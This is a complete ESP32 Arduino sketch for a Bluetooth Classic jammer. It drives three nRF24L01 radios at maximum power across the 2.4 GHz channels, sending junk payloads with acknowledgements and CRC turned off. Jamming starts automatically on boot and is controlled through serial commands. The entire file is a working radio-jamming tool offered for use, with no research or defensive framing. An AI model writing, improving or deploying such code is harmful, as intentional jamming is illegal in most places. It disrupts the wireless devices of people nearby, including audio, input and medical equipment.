/*
 * esp32-nrf24-bt-jammer.ino
 * Bluetooth Classic Jammer – Auto‑start on boot.
 * Commands: start, stop, status, toggle, help
 */

#include <Arduino.h>
#include <RF24.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_task_wdt.h>
#include <esp_rom_sys.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

#define NRF_CE_PIN_A  4
#define NRF_CSN_PIN_A 5
#define NRF_CE_PIN_B  6
#define NRF_CSN_PIN_B 7
#define NRF_CE_PIN_C  8
#define NRF_CSN_PIN_C 9

static RF24 RadioA(NRF_CE_PIN_A, NRF_CSN_PIN_A);
static RF24 RadioB(NRF_CE_PIN_B, NRF_CSN_PIN_B);
static RF24 RadioC(NRF_CE_PIN_C, NRF_CSN_PIN_C);

static const uint8_t oddChannels[] = {
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,
  1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63
};

static const uint8_t evenChannels[] = {
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40,38,36,34,32,30,28,26,24,22,20,18,16,14,12,10,8,6,4,2,0,
  78,76,74,72,70,68,66,64,62,60,58,56,54,52,50,48,46,44,42,40
};

static const uint8_t mixedChannels[] = {
  40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,10,12,
  4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,
  5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,2,4,6,
  8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,5,7,
  9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,45,47,49,51,53,55,57,59,61,63,65,67,69,71,73,75,77,2,4,6,8,10,
  12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,1,3,5,7,9,11,
  13,15,17,19,21,23,25,27,29,31,33,35,37,39,41,43,44,45,46,47
};

static volatile bool _btActive = false;
static volatile bool _btStopping = false;
static volatile uint16_t _btIndex = 0;
static SemaphoreHandle_t _btSpiMutex = NULL;
static TaskHandle_t _btJammerTaskHandle = NULL;
static uint8_t _junk[32];
static size_t _channelCount = 0;

static void _configRadio(RF24& radio) {
  radio.begin();
  radio.setAutoAck(false);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setPayloadSize(32);
  radio.stopListening();
}

static void _btJammerTask(void* pv) {
  #if CONFIG_IDF_TARGET_ESP32
    esp_task_wdt_delete(NULL);
  #endif

  for(int i = 0; i < 32; i++) _junk[i] = (i % 2 == 0) ? 0xAA : 0x55;
  bool wasActive = false;

  while (!_btStopping) {
    if (!_btActive) {
      if (wasActive) {
        RadioA.powerDown();
        RadioB.powerDown();
        RadioC.powerDown();
        wasActive = false;
      }
      vTaskDelay(pdMS_TO_TICKS(10));
      continue;
    }

    if (!wasActive) {
      RadioA.powerUp();
      RadioB.powerUp();
      RadioC.powerUp();
      _configRadio(RadioA);
      _configRadio(RadioB);
      _configRadio(RadioC);
      RadioA.stopListening();
      RadioB.stopListening();
      RadioC.stopListening();
      wasActive = true;
    }

    if (xSemaphoreTake(_btSpiMutex, 0) == pdTRUE) {
      RadioA.setChannel(oddChannels[_btIndex % _channelCount]);
      RadioB.setChannel(evenChannels[_btIndex % _channelCount]);
      RadioC.setChannel(mixedChannels[_btIndex % _channelCount]);

      RadioA.flush_tx();
      RadioB.flush_tx();
      RadioC.flush_tx();

      RadioA.writeFast(_junk, 32, 1);
      esp_rom_delay_us(5);
      RadioB.writeFast(_junk, 32, 1);
      esp_rom_delay_us(5);
      RadioC.writeFast(_junk, 32, 1);
      esp_rom_delay_us(5);

      _btIndex++;
      xSemaphoreGive(_btSpiMutex);
    } else {
      _btIndex++;
    }

    esp_rom_delay_us(135);
  }

  RadioA.powerDown();
  RadioB.powerDown();
  RadioC.powerDown();
  RadioA.stopListening();
  RadioB.stopListening();
  RadioC.stopListening();
  digitalWrite(NRF_CE_PIN_A, LOW);
  digitalWrite(NRF_CE_PIN_B, LOW);
  digitalWrite(NRF_CE_PIN_C, LOW);

  _btJammerTaskHandle = NULL;
  vTaskDelete(NULL);
}

bool startBtJammer() {
  if (_btJammerTaskHandle != NULL) return false;

  if (_channelCount == 0) {
    size_t minSize = sizeof(oddChannels);
    if (sizeof(evenChannels) < minSize) minSize = sizeof(evenChannels);
    if (sizeof(mixedChannels) < minSize) minSize = sizeof(mixedChannels);
    _channelCount = minSize;
  }

  esp_wifi_stop();
  esp_wifi_deinit();
  esp_bt_controller_deinit();

  if (_btSpiMutex == NULL) {
    _btSpiMutex = xSemaphoreCreateMutex();
    if (_btSpiMutex == NULL) return false;
  }

  _configRadio(RadioA);
  _configRadio(RadioB);
  _configRadio(RadioC);
  RadioA.stopListening();
  RadioB.stopListening();
  RadioC.stopListening();

  _btActive = true;
  _btStopping = false;
  _btIndex = 0;

  BaseType_t res = xTaskCreatePinnedToCore(_btJammerTask, "bt_jammer", 4096, NULL, 24, &_btJammerTaskHandle, 0);
  if (res != pdPASS) {
    _btActive = false;
    return false;
  }
  return true;
}

bool stopBtJammer() {
  if (_btJammerTaskHandle == NULL) return false;

  _btActive = false;
  _btStopping = true;

  uint32_t timeout = millis() + 2000;
  while (_btJammerTaskHandle != NULL && millis() < timeout) vTaskDelay(pdMS_TO_TICKS(10));

  if (_btJammerTaskHandle != NULL) {
    vTaskDelete(_btJammerTaskHandle);
    _btJammerTaskHandle = NULL;
  }

  if (_btSpiMutex != NULL) {
    xSemaphoreTake(_btSpiMutex, portMAX_DELAY);
    RadioA.powerDown();
    RadioB.powerDown();
    RadioC.powerDown();
    xSemaphoreGive(_btSpiMutex);
  }
  return true;
}

bool btJammerIsActive() { return _btActive && _btJammerTaskHandle != NULL; }
bool btJammerToggle() { return btJammerIsActive() ? stopBtJammer() : startBtJammer(); }

void setup() {
  Serial.begin(115200);
  delay(500);  // wait for serial monitor
  Serial.println("\nESP32 BT Jammer – Aggressive Mode, Auto‑start");
  Serial.println("Commands: start, stop, status, toggle, help");

  // Auto‑start jamming
  if (startBtJammer()) {
    Serial.println("> Jamming started automatically.");
  } else {
    Serial.println("! Failed to auto‑start. Type 'start' to try again.");
  }
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();

    if (cmd == "start") {
      if (startBtJammer()) Serial.println("> Started.");
      else Serial.println("! Already running or error.");
    } else if (cmd == "stop") {
      if (stopBtJammer()) Serial.println("> Stopped.");
      else Serial.println("! Not running.");
    } else if (cmd == "status") {
      Serial.printf("Jammer is %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
    } else if (cmd == "toggle") {
      btJammerToggle();
      Serial.printf("> Toggled. Now %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
    } else if (cmd == "help") {
      Serial.println("Commands: start, stop, status, toggle, help");
    } else if (cmd.length() > 0) {
      Serial.println("Unknown. Type 'help'.");
    }
  }
  delay(10);
}
